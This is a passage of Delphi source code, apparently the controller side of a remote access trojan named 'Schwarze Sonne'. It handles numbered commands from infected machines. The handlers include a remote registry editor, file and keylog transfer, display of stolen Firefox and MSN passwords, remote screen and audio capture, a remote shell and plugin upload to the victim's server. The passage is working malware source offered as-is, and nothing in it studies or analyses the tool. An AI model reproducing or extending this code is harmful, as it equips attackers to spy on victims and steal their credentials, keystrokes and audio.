          if sItem.SubItems.Objects[5] <> nil then begin
           TForm11(sItem.SubItems.Objects[5]).Show;
          end else begin
            sRegEditr := tform11.Create(nil);
            sRegEditr.Show;
            sRegEditr.Caption := 'Registryeditor - ' +  sItem.SubItems.Strings[1];
            sRegEditr.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sRegEditr.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[5] := sRegEditr;
          end;
          TForm11(sItem.SubItems.Objects[5]).tv1.Selected.DeleteChildren;
          for i := 1 to pStrList.Count - 1 do begin
            Nodo := TForm11(sItem.SubItems.Objects[5]).tv1.Items.AddChild(TForm11(sItem.SubItems.Objects[5]).tv1.Selected, pStrList.Strings[i]);
            Nodo.ImageIndex := 0;
            Nodo.SelectedIndex := 0;
          end;
          TForm11(sItem.SubItems.Objects[5]).tv1.Selected.Expand(False);
        end;
        if cmd = '36' then begin
          if sItem.SubItems.Objects[5] <> nil then begin
           TForm11(sItem.SubItems.Objects[5]).Show;
          end else begin
            sRegEditr := tform11.Create(nil);
            sRegEditr.Show;
            sRegEditr.Caption := 'Registryeditor - ' +  sItem.SubItems.Strings[1];
            sRegEditr.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sRegEditr.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[5] := sRegEditr;
          end;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);
            saItem := TForm11(sItem.SubItems.Objects[5]).lvwRegedit.Items.Add;
            saItem.Caption := cStrList.Strings[0];
            saitem.SubItems.Add(cStrList.Strings[1]);
            saitem.SubItems.Add(cStrList.Strings[2]);
            if (cStrList.Strings[1] = 'REG_BINARY') or (cStrList.Strings[1] = 'REG_DWORD') then
            Begin
              saItem.ImageIndex := 2;
            end
            else
            Begin
              saItem.ImageIndex := 3;
            End;
          end;
        end;

        if cmd = '40' then begin
          TransSize := StrToInt(pStrList.Strings[2]);
          TransName :=  pStrList.Strings[1];
          TransSocket := Sock;
          SendFile;
          goto disconnect;
        end;

        if Cmd = '41' then begin
           TransSize := StrToInt(pStrList.Strings[1]);
           TransSocket := Sock;
           TempSocket := strtoint(pStrList.Strings[2]);
           TransKeylog;
           goto disconnect;
        end;
        if Cmd = '43' then begin
           if sItem.SubItems.Objects[7] <> nil then begin
              TForm13(sItem.SubItems.Objects[7]).Show;
          end else begin
            sPasswords := tform13.Create(nil);
            sPasswords.Show;
            sPasswords.Caption := 'Password Recovery - ' +  sItem.SubItems.Strings[1];
            sPasswords.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sPasswords.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[7] := sPasswords;
          end;
          for i := 1 to pStrList.Count - 1 do begin
            try
            cStrList := Explode('#',pStrList.Strings[i]);
            saItem := TForm13(sItem.SubItems.Objects[7]).lv1.Items.Add;
            saItem.Caption := 'Firefox Password';
            saitem.SubItems.Add(cStrList.Strings[1]);
            saitem.SubItems.Add(cStrList.Strings[2]);
            saItem.SubItems.Add(cStrList.Strings[0]);
            except
            end;
          end;
        end;
        if Cmd = '44' then begin
           if sItem.SubItems.Objects[7] <> nil then begin
              TForm13(sItem.SubItems.Objects[7]).Show;
          end else begin
            sPasswords := tform13.Create(nil);
            sPasswords.Show;
            sPasswords.Caption := 'Password Recovery - ' +  sItem.SubItems.Strings[1];
            sPasswords.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sPasswords.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[7] := sPasswords;
          end;
          for i := 1 to pStrList.Count - 1 do begin
            try
            cStrList := Explode('#',pStrList.Strings[i]);
            saItem := TForm13(sItem.SubItems.Objects[7]).lv1.Items.Add;
            saItem.Caption := 'MSN Password';
            saitem.SubItems.Add(cStrList.Strings[0]);
            saitem.SubItems.Add(cStrList.Strings[1]);
            saItem.SubItems.Add('');
            except
            end;
          end;
        end;
        if cmd = '50' then begin
          Tempsocket :=  strtoint(pStrList.Strings[1]);
          TransSocket:= Sock;
          for i := 0 to MainForm.lv1.Items.Count -1 do begin
            if MainForm.lv1.Items.Item[i].SubItems.Strings[0]= IntToStr(TempSocket) then begin
              tTempScreenN := TForm12(mainform.lv1.items.item[i].subitems.Objects[6]);
            end;
          end;
          if tTempScreenN.stat1.Panels.Items[2].Text = '0' then begin
          tTempScreenN.stat1.Panels.Items[2].Text := IntToStr(Sock);
          tTempScreenN.Label2.Enabled := true;
          tTempScreenN.pb1.Enabled := true;
          tTempScreenN.img1.Enabled := true;
          tTempScreenN.chk1.Enabled := true;
          tTempScreenN.TrackBar1.Enabled := true;
          tTempScreenN.chk2.Enabled := true;
          tTempScreenN.UpDown1.Enabled := true;
          tTempScreenN.Label1.Enabled := true;
          tTempScreenN.lbl1.Enabled := true;
          tTempScreenN.PngBitBtn1.Enabled := true;
          if tTempScreenN.PngBitBtn1.caption = 'Stop' then begin
          sTempSTRr := 'SEND' + inttostr(tTempScreenN.ssRation) + '|' + inttostr(tTempScreenN.trackbar1.Position) + '|' +#10;
          send(sock,stempstrr[1],Length(sTempSTRr),0);
          end;
          tTempScreenN.ProcessData;
          end;
          goto disconnect;
        end;
        if cmd = '51' then begin
          if sItem.SubItems.Count <> 0 then begin
          sItem.SubItems.Strings[4] := pStrList.Strings[1];
          end;
        end;
        if cmd = '88' then begin
          info.socket := sock;
          info.Lent := strtoint(pStrList.Strings[2]);
          createthread(nil,0,@startmes,@info,0,sThreadID);
          mIDs := strtoint(pStrList.Strings[2]);
        end;
        if cmd = '89' then begin
          Plugins[mIDs].ReceiveData(sock,pStrList.Strings[1]);
        end;
        if cmd = '90' then begin
          messagebox(mainform.Handle,pchar('Plugin is missing and will be uploaded. After the upload please restart Server to get the Plugin to work!'),pchar('Schwarze Sonne'),0);
          sTempSTRr :=IntToStr(40) + '|' +
            IntToStr(GetFileSize(Plugins[mIDs].sServPluginname)) + '|' +
            pStrList.Strings[1] + ExtractFileName(Plugins[mIDs].sServPluginname) + '|' +
            Plugins[mIDs].sServPluginname + #10;
            Send(strtoint(pStrList.Strings[2]), sTempSTRr[1], Length(sTempSTRr), 0);
        end;

        if cmd = '77' then begin
          for i := 1 to pStrList.Count - 1 do begin
            try
            cStrList := Explode('#',pStrList.Strings[i]);
            saItem := TForm5(sItem.SubItems.Objects[2]).lv3.Items.Add;
            saItem.Caption := cStrList.Strings[0];
            saitem.SubItems.Add(cStrList.Strings[1]);
            saitem.SubItems.Add(cStrList.Strings[2]);
            except
            end;
          end;
        end;
        if cmd = '95' then begin
          TForm5(sItem.SubItems.Objects[2]).lv2.clear;
          for i := 1 to pStrList.Count - 1 do begin
            try
            cStrList := Explode('#',pStrList.Strings[i]);
            saItem := TForm5(sItem.SubItems.Objects[2]).lv2.Items.Add;
            saItem.Caption := cStrList.Strings[0];
            saitem.SubItems.Add(cStrList.Strings[1]);
            saitem.SubItems.Add(cStrList.Strings[2]);
            except
            end;
          end;
        end;
        if cmd = '98' then begin
            TForm12(sItem.SubItems.Objects[6]).sForm := sItem.SubItems.Objects[6];
            TForm12(sItem.SubItems.Objects[6]).sWidth := strtoint(pStrList.Strings[1]);
            TForm12(sItem.SubItems.Objects[6]).sHeight := strtoint(pStrList.Strings[2]);
            TForm12(sItem.SubItems.Objects[6]).sRatio := (TForm12(sItem.SubItems.Objects[6]).swidth / TForm12(sItem.SubItems.Objects[6]).sheight);
            tform12(sItem.SubItems.Objects[6]).FormResize(nil);
            tform12(sItem.SubItems.Objects[6]).FormResize(nil);
        end;
        if cmd = '201' then begin
           TForm18(sItem.SubItems.Objects[9]).edit1.enabled := true;
           TForm18(sItem.SubItems.Objects[9]).popupmenu1.Items.Items[0].Enabled := false;
           TForm18(sItem.SubItems.Objects[9]).popupmenu1.Items.Items[1].Enabled := True;
           TForm18(sItem.SubItems.Objects[9]).memo1.text := 'Shell started!' + #13 + #10;
        end;
        if cmd = '202' then begin
           TForm18(sItem.SubItems.Objects[9]).edit1.enabled := false;
           TForm18(sItem.SubItems.Objects[9]).popupmenu1.Items.Items[0].Enabled := True;
           TForm18(sItem.SubItems.Objects[9]).popupmenu1.Items.Items[1].Enabled := false;
           TForm18(sItem.SubItems.Objects[9]).memo1.text := 'Shell closed!';
        end;
        if cmd = '200' then begin
        temp := pStrList.Strings[1];
          repeat
            temp[pos(#222,temp)] := #10;
          until pos(#222,temp) = 0;
            TForm18(sItem.SubItems.Objects[9]).memo1.text := TForm18(sItem.SubItems.Objects[9]).memo1.text + temp;
            TForm18(sItem.SubItems.Objects[9]).memo1.SelLength := length(TForm18(sItem.SubItems.Objects[9]).memo1.Text);
        end;
        if cmd = '300' then begin
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[1].SubItems[0] := pStrList.Strings[1];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[2].SubItems[0] := pStrList.Strings[2];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[3].SubItems[0] := pStrList.Strings[3];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[4].SubItems[0] := pStrList.Strings[4];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[5].SubItems[0] := pStrList.Strings[5];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[6].SubItems[0] := pStrList.Strings[6];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[7].SubItems[0] := pStrList.Strings[7];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[8].SubItems[0] := pStrList.Strings[8];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[9].SubItems[0] := pStrList.Strings[9];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[10].SubItems[0] := pStrList.Strings[10];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[11].SubItems[0] := pStrList.Strings[11];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[12].SubItems[0] := pStrList.Strings[12];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[15].SubItems[0] := pStrList.Strings[13];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[16].SubItems[0] := pStrList.Strings[14];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[19].SubItems[0] := pStrList.Strings[15];
            TForm6(sItem.SubItems.Objects[8]).ListView1.Items.Item[22].SubItems[0] := pStrList.Strings[16];
        end;



        if cmd = '400' then begin
          Tempsocket :=  strtoint(pStrList.Strings[1]);
          TransSocket:= Sock;
          for i := 0 to MainForm.lv1.Items.Count -1 do begin
            if MainForm.lv1.Items.Item[i].SubItems.Strings[0]= IntToStr(TempSocket) then begin
              tTempAudio := TForm19(mainform.lv1.items.item[i].subitems.Objects[10]);
            end;
          end;
          tTempAudio.stat1.Panels.Items[2].Text := IntToStr(Sock);
          tTempAudio.sStop := false;
          tTempAudio.ProcessData;
          goto disconnect;
        end;

        if cmd='402' then begin
          TransSize := StrToInt(pStrList.Strings[1]);
          TransName :=  ExtractFileName(pStrList.Strings[2]);
          tempsocket := strtoint(pStrList.Strings[3]);
          TransSocket := Sock;
          TransThumbDesktop;
          goto disconnect;
        end;
      sDat := '';
    end;
  Until 1 = 2;
  if sitem <> nil then begin
  if sThreadID <> 0 then begin
    mKillThreadID := OpenThread($0001,FALSE,sThreadID);
    terminatethread(mKillThreadID ,0);
  end;
  synchronize(killlistitem);
  end;
  Disconnect:
  CloseSocket(Sock);
End;
end.

